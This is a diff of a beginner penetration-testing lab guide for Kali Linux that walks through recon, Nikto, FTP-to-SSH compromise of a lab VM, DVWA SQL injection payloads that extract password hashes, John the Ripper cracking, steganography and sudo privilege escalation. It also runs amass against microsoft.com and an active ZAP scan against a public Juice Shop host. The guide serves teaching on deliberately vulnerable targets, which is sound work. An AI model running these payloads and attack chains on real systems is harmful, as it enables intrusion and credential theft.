@@ -1,361 +1,366 @@
-# Lab Manual – Step-by-Step Beginner Guide
+# Vulnerability Assessment & Penetration Testing Lab Guide
+### BICL606 — Beginner Step-by-Step Guide
 
-> **Environment:** Kali Linux | All commands run in Terminal unless stated otherwise.  
-> **Tip:** Wherever you see `#` at the start of a command, you are running as **root**. Use `sudo su` to become root, or prefix commands with `sudo`.
+> **Environment:** Kali Linux (VirtualBox)  
+> **Run all terminal commands as root** — use `sudo su -` to become root first.
 
 ---
 
-## Program 1 – Nikto Web Vulnerability Scanner on DVWA
+## Experiment 1: Network Reconnaissance & Footprinting
 
 ### What is this?
-Nikto is a tool that scans a web server and reports security vulnerabilities, misconfigurations, and interesting files. Here we scan DVWA (Damn Vulnerable Web Application) running locally.
+We find live devices on the network, scan their open ports, identify services/OS, and enumerate subdomains of an external domain using Amass.
 
-### Pre-requirement
-DVWA must already be running on your machine at `http://127.0.0.1/DVWA`.  
-*(If it is not set up yet, complete Program 3 & 4 first, then come back.)*
+---
+
+### Part A – Internal Network Scanning (Nmap)
+
+**Step 1 – Open Terminal and become root**
+```bash
+sudo su -
+```
+
+**Step 2 – Find your own IP address**
+```bash
+ip a
+```
+Note your IPv4 address (e.g., `192.168.1.3`) and subnet mask. Calculate CIDR (e.g., `255.255.255.0` → `/24`).
+
+**Step 3 – Discover live hosts in the network**
+```bash
+nmap -sn 192.168.1.1
+```
+This does a ping scan — shows which hosts are up without scanning ports.
+
+**Step 4 – Pick a live host and do a detailed scan**
+```bash
+nmap -sS -sV -O 192.168.1.1
+```
+- `-sS` → SYN (stealth) scan
+- `-sV` → Detect service versions
+- `-O` → Guess the operating system
+
+This gives you: open ports, running services, and guessed OS.
+
+**Step 5 – Aggressive scan on the whole subnet**
+```bash
+nmap -A 192.168.1.0/24
+```
+- `-A` → OS detection + version detection + scripts + traceroute
+
+---
+
+### Part B – External Reconnaissance (Amass)
+
+**Step 1 – Check if Amass is installed**
+```bash
+amass -version
+```
+If not installed:
+```bash
+apt install amass -y
+```
+
+**Step 2 – Run subdomain enumeration on a domain**
+```bash
+amass enum -d microsoft.com
+```
+Wait for results. You will see subdomains, IPs, ASN numbers, and hosting provider details.
+
+**Step 3 – Note down the output**
+Record the subdomains, their IPs, and which provider hosts them.
+
+---
+
+### Expected Result
+Internal devices mapped with ports, services, and OS info. External domain subdomains listed with IP and ASN details.
+
+---
+
+---
+
+## Experiment 2: Vulnerability Scanning & Assessment
+
+### What is this?
+We use Nikto to scan the DVWA web application and find misconfigurations, dangerous paths, and outdated software.
+
+> **Pre-requirement:** DVWA must be running. If not set up yet, complete **Experiment 4 Steps 1–12** first, then come back here.
 
 ---
 
 ### Steps
 
-**Step 1 – Open a Terminal**
-Click the terminal icon on your Kali taskbar, or press `Ctrl + Alt + T`.
+**Step 1 – Open Firefox and confirm DVWA is accessible**
+```
+http://127.0.0.1/DVWA
+```
 
-**Step 2 – Switch to root**
+**Step 2 – Open Terminal and run Nikto**
 ```bash
-sudo su -
+nikto -h http://127.0.0.1/DVWA/
 ```
-Enter your Kali password when prompted.
+Wait ~1 minute. Findings will scroll in the terminal.
 
-**Step 3 – Confirm Nikto is installed**
-```bash
-nikto -Version
-```
-You should see something like `Nikto v2.5.0`. If not, install it:
-```bash
-apt install nikto -y
-```
+**Step 3 – Note the paths Nikto reports**
 
-**Step 4 – Run Nikto against DVWA**
-```bash
-nikto -h http://127.0.0.1/DVWA
-```
-- `-h` means **host** (the target URL).
+For example:
+- `/DVWA/config/`
+- `/DVWA/tests/`
+- `/DVWA/login.php`
 
-**Step 5 – Wait for the scan to finish**
-The scan takes about 30–60 seconds. You will see lines scrolling showing findings like:
-- Missing security headers (X-Frame-Options, Content-Type)
-- Allowed HTTP methods (GET, POST, OPTIONS, HEAD)
-- Interesting directories: `/DVWA/config/`, `/DVWA/tests/`, `/DVWA/database/`
-- Admin login page found at `/DVWA/login.php`
-- PHP backdoor file manager paths
-- Git config/index files found
-- A backdoor identified at `/DVWA/shell%Cat`
+**Step 4 – Test those paths in the browser**
 
-**Step 6 – Read the summary**
-At the end you will see:
+Append each path to the base URL:
 ```
-+ 1 host(s) tested
+http://127.0.0.1/DVWA/config/
+http://127.0.0.1/DVWA/tests/
 ```
-Along with a note about Apache version and a suggestion to update Nikto's database.
+You will see directory listings — confirming directory indexing is enabled (a vulnerability).
 
 ---
 
-### Expected Output (key lines)
-```
-- Target IP:       127.0.0.1
-- Target Hostname: 127.0.0.1
-- Target Port:     80
-- Nikto v2.5.0
-+ Server: Apache/2.4.63 (Debian)
-+ /DVWA/config/: Directory indexing found.
-+ /DVWA/login.php: Admin login page/section found.
-+ /DVWA/shell%Cat/etc/hosts: A backdoor was identified.
-+ 1 host(s) tested
-```
+### Expected Result
+Nikto reports server version, missing headers, open directories, admin login page, PHP backdoor paths. Verified in browser.
 
 ---
 
-### Troubleshooting
-| Problem | Fix |
+---
+
+## Experiment 3: Exploiting a Known Vulnerability
+
+### What is this?
+We use netdiscover to find a target (Sunset machine), scan it with Nmap, exploit anonymous FTP to download a password hash, crack it with John the Ripper, and log in via SSH.
+
+> **Pre-requirement:** Both **Sunset** and **Kali** machines must be running in VirtualBox.
+
+---
+
+### Steps
+
+**Step 1 – Network Discovery**
+```bash
+netdiscover
+```
+Wait for ARP packets. Look for the machine labelled **PCS System** under hostname — that is your target. Note its IP (e.g., `192.168.1.104`). Press `Ctrl+C` to stop.
+
+**Step 2 – Port and Service Scan**
+```bash
+nmap -A -p- 192.168.1.104
+```
+Confirm open ports:
+- Port **21** — FTP (vsftpd 2.3.4)
+- Port **22** — SSH (OpenSSH)
+
+**Step 3 – FTP Anonymous Login**
+```bash
+ftp 192.168.1.104
+```
+When prompted:
+```
+Username: anonymous
+Password: (press Enter — leave blank)
+```
+
+**Step 4 – List and download the backup file**
+```bash
+ls
+get backup
+exit
+```
+
+**Step 5 – View the backup file**
+```bash
+cat backup
+```
+You will see a password hash inside.
+
+**Step 6 – Save the hash to a file**
+```bash
+nano sunset.txt
+```
+Paste the hash content. Save: `Ctrl+O` → Enter → `Ctrl+X`
+
+**Step 7 – Crack the password**
+```bash
+john sunset.txt
+```
+The cracked password will be shown (e.g., `cheer14` for user `sunset`).
+
+**Step 8 – SSH into the target**
+```bash
+ssh sunset@192.168.1.104
+```
+Enter the cracked password when prompted.
+
+---
+
+### Expected Result
+
+| Step | Result |
 |---|---|
-| `Connection refused` | DVWA/Apache is not running. Run `service apache2 start` first. |
-| `nikto: command not found` | Run `apt install nikto -y` |
-| Scan hangs | Press `Ctrl+C` to stop; try adding `-timeout 10` to the command |
+| Nmap | FTP port 21 open, vsftpd 2.3.4 |
+| FTP anonymous login | Connected, `backup` file downloaded |
+| John the Ripper | Password cracked: `cheer14` |
+| SSH login | Successfully logged in as `sunset` |
 
 ---
 
-## Program 2 – Nmap Port Scan + DNS Enumeration
+---
+
+## Experiment 4: SQL Injection Attacks on Web Applications
 
 ### What is this?
-- **Nmap** scans a host to find open ports and services.
-- **DNS enumeration** traces how a domain resolves through CNAME/A records.
+We set up DVWA, then use SQL injection in the browser to extract database version, table names, and user credentials.
 
 ---
 
-### Part A – Nmap Scan
+### Part A – DVWA Setup (One-time)
 
-**Step 1 – Open Terminal and become root**
+**Step 1 – Clone DVWA and move to web folder**
 ```bash
 sudo su -
-```
-
-**Step 2 – Run an Nmap scan on a target IP**
-```bash
-nmap -sV 192.168.1.1
-```
-- `-sV` detects service versions on open ports.
-
-**Step 3 – Read the output**
-
-Expected output:
-```
-PORT      STATE     SERVICE   VERSION
-23/tcp    filtered  telnet
-53/tcp    open      domain    Unbound
-80/tcp    open      http
-443/tcp   open      ssl/https
-```
-
-**Step 4 (Optional) – Aggressive scan for more detail**
-```bash
-nmap -p- -A 192.168.1.1
-```
-- `-p-` scans ALL 65535 ports.
-- `-A` enables OS detection, version detection, script scanning, and traceroute.
-
----
-
-### Part B – DNS Enumeration (nslookup / host)
-
-**Step 1 – Look up a domain's DNS chain**
-```bash
-host learn.microsoft.com
-```
-or
-```bash
-nslookup learn.microsoft.com
-```
-
-**Step 2 – Read the CNAME chain in output**
-
-Expected output pattern:
-```
-learn.microsoft.com → cname_record → learn-public.trafficmanager.net
-microsoft.com       → node         → fpt.dfp.microsoft.com
-```
-
-**Step 3 – Look up an A record (IP address)**
-```bash
-host tide42.microsoft.com
-```
-Expected:
-```
-tide42.microsoft.com → a_record → 207.46.238.142
-```
-
----
-
-### Part C – Open DVWA in Browser
-
-**Step 1 – Open Firefox in Kali**
-
-**Step 2 – Type in the address bar:**
-```
-127.0.0.1/DVWA
-```
-
-**Step 3 – You should see the DVWA login/welcome page.**
-This confirms DVWA is accessible and running.
-
----
-
-## Program 3 – Setting Up DVWA (One-time Setup)
-
-### What is this?
-DVWA (Damn Vulnerable Web Application) is an intentionally insecure PHP/MySQL web app used for practising attacks legally on your own machine.
-
----
-
-### Steps
-
-**Step 1 – Open Terminal and become root**
-```bash
-sudo su -
-```
-
-**Step 2 – Clone DVWA from GitHub**
-```bash
 git clone https://github.com/digininja/DVWA.git
-```
-Wait for it to download (~2.49 MiB).
-
-**Step 3 – Move DVWA to the web server folder**
-```bash
 mv DVWA /var/www/html
-```
-
-**Step 4 – Go to the web folder and confirm**
-```bash
 cd /var/www/html
 ls
 ```
 You should see: `DVWA  index.html  index.nginx-debian.html`
 
-**Step 5 – Start Apache web server**
+**Step 2 – Start Apache**
 ```bash
 service apache2 start
 ```
 
-**Step 6 – Enter the DVWA directory and copy the config file**
+**Step 3 – Copy the config file**
 ```bash
-cd DVWA
+cd /var/www/html/DVWA
 cp config/config.inc.php.dist config/config.inc.php
 ```
 
-**Step 7 – Start MariaDB (MySQL)**
+**Step 4 – Start MySQL**
 ```bash
-service mariadb start
+sudo systemctl start mysql
 ```
-> If you see `Failed to start meriadb.service: Unit meriadb.service not found` — note the typo. The correct command is `mariadb` not `meriadb`. Run:
+If you see an error about `meriadb`, ignore it and use the command above.
+
+**Step 5 – Check MySQL is running**
 ```bash
-service mariadb start
+sudo systemctl status mysql
 ```
+Press `q` to exit.
 
----
-
-## Program 4 – Configure DVWA Database in MariaDB
-
-### What is this?
-We create the database and user that DVWA needs to function.
-
----
-
-### Steps
-
-**Step 1 – Open the MariaDB shell**
+**Step 6 – Open MySQL shell**
 ```bash
 mysql
 ```
 You will see the `MariaDB [(none)]>` prompt.
 
-**Step 2 – Create the DVWA database**
+**Step 7 – Create database and user (run these one by one)**
 ```sql
-create database dvwa;
-```
-Output: `Query OK, 1 row affected`
-
-**Step 3 – Create a database user**
-```sql
-create user dvwa@localhost identified by 'p@ssw0rd';
-```
-Output: `Query OK, 0 rows affected`
-
-**Step 4 – Grant the user full access to the dvwa database**
-```sql
-grant all on dvwa.* to dvwa@localhost;
-```
-Output: `Query OK, 0 rows affected`
-
-**Step 5 – Apply the changes**
-```sql
-flush privileges;
-```
-Output: `Query OK, 0 rows affected`
-
-**Step 6 – Exit MariaDB**
-```sql
+CREATE DATABASE dvwa;
+CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
+FLUSH PRIVILEGES;
 exit
 ```
 
-**Step 7 – Open Firefox and go to DVWA setup page**
+**Step 8 – Edit DVWA config**
+```bash
+sudo nano /var/www/html/DVWA/config/config.inc.php
+```
+Update these lines:
+```
+$_DVWA['db_user'] = 'dvwa';
+$_DVWA['db_password'] = 'password';
+$_DVWA['db_database'] = 'dvwa';
+```
+Save: `Ctrl+X` → `Y` → `Enter`
+
+**Step 9 – Restart services**
+```bash
+sudo systemctl restart apache2
+sudo systemctl restart mysql
+```
+
+**Step 10 – Open DVWA setup in browser**
 ```
 http://localhost/DVWA/setup.php
 ```
+Scroll to the bottom → Click **"Create / Reset Database"**
+Login when prompted: `admin` / `password`
 
-**Step 8 – Scroll down and click "Create / Reset Database"**
-
-You should see the Setup Check page showing:
-- Operating system: *nix ✓
-- DVWA version info
-- reCAPTCHA key: **Missing** (normal, ignore for now)
-- Writable folder: **No** — fix this with:
-```bash
-chmod 777 /var/www/html/DVWA/hackable/uploads/
-```
-Then refresh the page and click the button again.
-
-**Step 9 – DVWA is ready. Log in at:**
-```
-http://localhost/DVWA/login.php
-```
-Default credentials: `admin` / `password`
+You will now see the full DVWA dashboard.
 
 ---
 
-## Program 5 – SQL Injection on DVWA
+### Part B – SQL Injection
+
+**Step 11 – Set Security Level to Low**
+- Click **DVWA Security** in the left panel.
+- Set level to **Low** → Click Submit.
+
+**Step 12 – Click "SQL Injection" in the left panel**
+
+**Step 13 – Basic test: enter `1` in User ID → Submit**
+A name should be returned — field is working.
+
+**Step 14 – Inject: show all users**
+```
+%' or '0'='0
+```
+Returns ALL users. Equivalent SQL:
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '%' OR '0'='0';
+```
+
+**Step 15 – Inject: show database version**
+```
+%' or 0=0 union select null,version() #
+```
+The MySQL version number appears in the Surname field.
+
+**Step 16 – Inject: show all tables in information_schema**
+```
+%' and 1=0 union select null,table_name from information_schema.tables #
+```
+Lists all tables in the MySQL information_schema database.
+
+---
+
+### Expected Result
+All users returned, DB version revealed, table names from information_schema listed.
+
+---
+
+---
+
+## Experiment 6: Password Cracking & Credential Harvesting
 
 ### What is this?
-SQL Injection is a technique where you insert malicious SQL code into an input field to manipulate the database. Here we extract usernames and password hashes.
+We take the MD5 hashes from DVWA SQL injection and crack them using John the Ripper.
 
 ---
 
 ### Steps
 
-**Step 1 – Log into DVWA**
-Go to `http://127.0.0.1/DVWA/login.php`  
-Login: `admin` / `password`
+**Step 1 – Get hashes from DVWA (if not done yet)**
 
-**Step 2 – Set Security Level to Low**
-- Click **DVWA Security** in the left menu.
-- Set the security level to **Low**.
-- Click **Submit**.
-
-**Step 3 – Click "SQL Injection" in the left menu**
-
-**Step 4 – In the "User ID" box, type this payload and click Submit:**
-```
-' or 1=1 union select null, version() #
-```
-This tests if the field is injectable and returns the DB version.
-
-**Step 5 – Extract all usernames and passwords with this payload:**
+In DVWA SQL Injection, enter:
 ```
 ' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
 ```
+This displays usernames and their MD5 hashes.
 
-**Step 6 – Read the output**
-
-You will see entries like:
-```
-First name: admin
-Surname: admin
-admin
-5f4dcc3b5aa765d61d8327deb882cf99
-
-First name: Gordon
-Surname: Brown
-gordonb
-e99a18c428cb38d5f260853678922e03
-```
-These are MD5 password hashes.
-
----
-
-## Program 6 – Password Hash Cracking with John the Ripper
-
-### What is this?
-John the Ripper cracks hashed passwords using wordlists. We crack the MD5 hashes obtained from the SQL injection above.
-
----
-
-### Steps
-
-**Step 1 – Create a file with the hashes**
+**Step 2 – Navigate to John's directory**
 ```bash
-nano hashes.txt
+cd /usr/share/john/
 ```
-Paste the hashes in `username:hash` format:
+
+**Step 3 – Create the hash file**
+```bash
+nano dvwa_password.txt
+```
+Type the hashes in `username:hash` format:
 ```
 admin:5f4dcc3b5aa765d61d8327deb882cf99
 gordonb:e99a18c428cb38d5f260853678922e03
@@ -363,87 +368,69 @@ gordonb:e99a18c428cb38d5f260853678922e03
 pablo:0d107d09f5bbe40cade3de5c71e9e9b7
 smithy:5f4dcc3b5aa765d61d8327deb882cf99
 ```
-Press `Ctrl+O` to save, `Ctrl+X` to exit.
+Save: `Ctrl+O` → Enter → `Ctrl+X`
 
-**Step 2 – Check John the Ripper's wordlists location**
+**Step 4 – Run John the Ripper**
 ```bash
-ls /usr/share/john/
+john --format=raw-MD5 dvwa_password.txt
 ```
-You will see many files. The main wordlist for cracking is usually at:
-```bash
-ls /usr/share/wordlists/
-```
+Wait for it to finish cracking.
 
-**Step 3 – Run John with the rockyou wordlist**
+**Step 5 – Show cracked passwords**
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
-```
-> If rockyou.txt is compressed, unzip it first:
-```bash
-gunzip /usr/share/wordlists/rockyou.txt.gz
+john --format=raw-MD5 dvwa_password.txt --show
 ```
 
-**Step 4 – View cracked passwords**
+**Step 6 – Print proof (for submission)**
 ```bash
-john --show --format=raw-md5 hashes.txt
+date
+echo "Your Name"
 ```
-
-Expected results:
-```
-admin:password
-gordonb:abc123
-1337:charley
-pablo:letmein
-smithy:password
-```
+Replace `Your Name` with your actual name.
 
 ---
 
-## Program 7 – Network Discovery + Nmap + CTF Flag
+### Expected Result
+All 5 passwords cracked and displayed in plaintext.
+
+---
+
+---
+
+## Experiment 8: Privilege Escalation on a Compromised Host
 
 ### What is this?
-We use `netdiscover` to find live hosts on the network, then Nmap to scan a specific target, and then find hidden files (CTF flags) on that target.
+We scan a target, find open ports, discover hidden text files on the web server, SSH in, use steganography to extract hidden credentials, and escalate to root.
+
+> **Pre-requirement:** Target machine (192.168.1.104) must be running in VirtualBox.
 
 ---
 
 ### Steps
 
-**Step 1 – Run netdiscover to find hosts on the network**
-```bash
-netdiscover -r 192.168.20.0/16
-```
-Wait for it to capture ARP packets. You will see a table like:
-```
-IP              MAC Address    Vendor
-192.168.1.1     ...            TP-LINK
-192.168.1.104   ...            PCS Systemtechnik GmbH   ← Target
-192.168.1.100   ...            OnePlus Technology
-```
-Note the target IP (e.g., `192.168.1.104`). Press `Ctrl+C` to stop.
-
-**Step 2 – Run a full Nmap scan on the target**
+**Step 1 – Nmap scan on target**
 ```bash
 nmap -p- -A 192.168.1.104
 ```
-Expected output:
-```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
-80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
-```
+Port **22 (SSH)** and port **80 (HTTP)** are open.
 
-**Step 3 – Open the target's web server in Firefox**
+**Step 2 – Open target web page in browser**
 ```
 http://192.168.1.104
 ```
-You should see the Apache2 Ubuntu Default Page.
+You see the Apache2 default page — not useful yet.
 
-**Step 4 – Check for a notes file**
-In the browser address bar, type:
+**Step 3 – Enumerate hidden .txt files**
+```bash
+dirb http://192.168.1.104/ -X .txt
+```
+This finds all `.txt` files on the server.
+
+**Step 4 – Read notes.txt in browser**
 ```
 http://192.168.1.104/notes.txt
 ```
-You will find notes like:
+Output:
 ```
 1- i should finish my second lab
 2- i should delete the remb.txt file and remb2.txt
@@ -457,125 +444,186 @@ Output:
 ```
 first_stage:flagitifyoucan1234
 ```
-**Flag found!** 🎉
+SSH credentials: user = `first_stage`, password = `flagitifyoucan1234`
 
----
-
-## Program 8 – Steganography + Privilege Escalation + ZAP Intro
-
-### Part A – Steghide (Extract Hidden Data from Image)
-
-**Step 1 – Make sure steghide is installed**
+**Step 6 – SSH into the target**
 ```bash
-apt install steghide -y
+ssh first_stage@192.168.1.104
+```
+Password: `flagitifyoucan1234`
+
+**Step 7 – Explore the system**
+```bash
+ls
+cat user.txt
+cd /home
+ls
+cd mhz_c1f
+ls
+cd Paintings
+ls
 ```
 
-**Step 2 – Extract hidden data from an image**
-(The image used in the lab is called `spinning the wool.jpeg`)
+**Step 8 – Copy the Paintings folder to Kali (open a NEW terminal on Kali)**
+```bash
+mkdir raj
+cd raj
+scp first_stage@192.168.1.104:/home/mhz_c1f/Paintings/* .
+ls
+```
+Enter SSH password when prompted.
+
+**Step 9 – Extract hidden data from image**
 ```bash
 steghide extract -sf "spinning the wool.jpeg"
 ```
+Press Enter when asked for passphrase (or try `flagitifyoucan1234`).
 
-**Step 3 – Enter the passphrase when prompted**
-(From the lab context, the passphrase found in the previous step is `flagitifyoucan1234`)
-
-**Step 4 – Read the extracted file**
+**Step 10 – Read extracted file**
 ```bash
 cat remb2.txt
 ```
 Output:
 ```
-ooh, i know should delete this, but i cant' remember it
+ooh, i know should delete this, but i cant remember it
 screw me
 mhz_c1f:1@ec1f
 ```
-You found credentials: **username:** `mhz_c1f` | **password:** `1@ec1f`
+New credentials: user = `mhz_c1f`, password = `1@ec1f`
 
----
-
-### Part B – Privilege Escalation to Root
-
-**Step 1 – Switch to the discovered user**
+**Step 11 – Switch to the new user**
 ```bash
 su mhz_c1f
 ```
-Enter password: `1@ec1f`
+Password: `1@ec1f`
 
-**Step 2 – Check your groups/privileges**
+**Step 12 – Check user privileges**
 ```bash
 id
 ```
-Output shows the user is in the **sudo** group:
-```
-uid=1000(mhz_c1f) gid=1000(mhz_c1f) groups=1000(mhz_c1f),4(adm),24(cdrom),27(sudo)
-```
+User is in the **sudo** group — can become root.
 
-**Step 3 – Escalate to root using sudo**
+**Step 13 – Escalate to root**
 ```bash
 sudo su
 ```
-Enter the password `1@ec1f` when prompted.
+Password: `1@ec1f`
 
-**Step 4 – Navigate to root's home directory**
+**Step 14 – Read the root flag**
 ```bash
 cd /root
 ls -la
-```
-You will see `.root.txt` in the listing.
-
-**Step 5 – Read the root flag**
-```bash
 cat .root.txt
 ```
 Output:
 ```
 OwO HACKER MAN :D
-
 Well done sir, you have successfully got the root flag.
-I hope you enjoyed in this mission.
-
 #mhz_cyber
 ```
-**Root flag captured!** 🏆
+**Root access achieved!** 🏆
 
 ---
 
-### Part C – Introduction to ZAP (OWASP Zed Attack Proxy)
+### Expected Result
+Full root access obtained via: web enumeration → SSH → steganography → sudo privilege escalation.
+
+---
+
+---
+
+## Experiment 9: Full Web Application Penetration Test (OWASP ZAP)
+
+### What is this?
+We use OWASP ZAP to automatically spider and scan OWASP Juice Shop for vulnerabilities like XSS, SQL injection, broken authentication, and insecure direct object references.
+
+---
+
+### Part A – Install OWASP ZAP
+
+**Option 1 – Via terminal (easiest)**
+```bash
+sudo apt update
+sudo apt install zaproxy -y
+```
+
+**Option 2 – Via installer download**
+- Go to `www.zaproxy.org` → Download → Select **Linux Installer**
+- Then in terminal:
+```bash
+cd Downloads
+ls
+chmod o+x ZAP_*.sh
+./ZAP_*.sh
+```
+Follow: Next → Install.
+
+---
+
+### Part B – Run Automated Scan
 
 **Step 1 – Launch ZAP**
 ```bash
 zaproxy
 ```
-Or find it in: Kali Menu → Web Application Analysis → zaproxy
+Or: Kali Menu → Web Application Analysis → OWASP ZAP
 
-**Step 2 – On the Welcome screen, choose one of:**
-- **Automated Scan** – enter a URL and ZAP scans it automatically.
-- **Manual Explore** – opens a browser through ZAP's proxy so you can browse and ZAP records traffic.
-- **Learn More** – documentation.
+**Step 2 – Start a new session**
+When prompted to persist session → click **No**.
 
-**Step 3 – For a quick automated scan:**
-- Click **Automated Scan**
-- Enter: `http://127.0.0.1/DVWA`
-- Click **Attack**
-- Wait for results in the Alerts tab at the bottom.
+**Step 3 – Close the welcome message box if it appears**
 
-> ZAP 2.16.1 or newer may show an update notification — you can dismiss it.
+**Step 4 – Go to Quick Start tab → Click "Automated Scan"**
+
+**Step 5 – Enter the target URL**
+```
+http://juice-shop.herokuapp.com
+```
+
+**Step 6 – Click "Attack"**
+ZAP will spider all pages and then actively scan for vulnerabilities.
+
+**Step 7 – Monitor progress**
+Watch the status bar at the bottom.
+
+**Step 8 – Review Alerts**
+Click the **Alerts** tab at the bottom.
+Double-click any alert to see:
+- Vulnerability description
+- Affected URL
+- Evidence
+- Recommended fix
+
+---
+
+### Expected Result
+Multiple vulnerabilities detected (XSS, SQLi, missing headers, etc.) listed in the Alerts tab with severity and remediation.
+
+---
 
 ---
 
 ## Quick Reference – All Commands
 
-| Program | Key Command |
+| Experiment | Command |
 |---|---|
-| Nikto scan | `nikto -h http://127.0.0.1/DVWA` |
-| Nmap version scan | `nmap -sV <IP>` |
-| Nmap full scan | `nmap -p- -A <IP>` |
-| DNS lookup | `host <domain>` |
-| Clone DVWA | `git clone https://github.com/digininja/DVWA.git` |
-| Start Apache | `service apache2 start` |
-| Start MariaDB | `service mariadb start` |
-| Open MySQL shell | `mysql` |
-| John the Ripper | `john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt` |
-| Netdiscover | `netdiscover -r 192.168.20.0/16` |
-| Steghide extract | `steghide extract -sf "image.jpeg"` |
-| Launch ZAP | `zaproxy` |
+| 1 – Find your IP | `ip a` |
+| 1 – Ping scan | `nmap -sn 192.168.1.0/24` |
+| 1 – Detailed scan | `nmap -sS -sV -O <IP>` |
+| 1 – Aggressive scan | `nmap -A 192.168.1.0/24` |
+| 1 – Subdomain enum | `amass enum -d microsoft.com` |
+| 2 – Nikto scan | `nikto -h http://127.0.0.1/DVWA/` |
+| 3 – Network discover | `netdiscover` |
+| 3 – FTP login | `ftp <IP>` → user: anonymous |
+| 3 – Crack hash | `john sunset.txt` |
+| 3 – SSH login | `ssh sunset@<IP>` |
+| 4 – Start Apache | `service apache2 start` |
+| 4 – Start MySQL | `sudo systemctl start mysql` |
+| 4 – MySQL shell | `mysql` |
+| 6 – Crack MD5 | `john --format=raw-MD5 dvwa_password.txt` |
+| 6 – Show results | `john --format=raw-MD5 dvwa_password.txt --show` |
+| 8 – dirb scan | `dirb http://<IP>/ -X .txt` |
+| 8 – SCP copy | `scp user@<IP>:/path/* .` |
+| 8 – Steghide | `steghide extract -sf "image.jpeg"` |
+| 8 – Escalate | `sudo su` |
+| 9 – Launch ZAP | `zaproxy` |
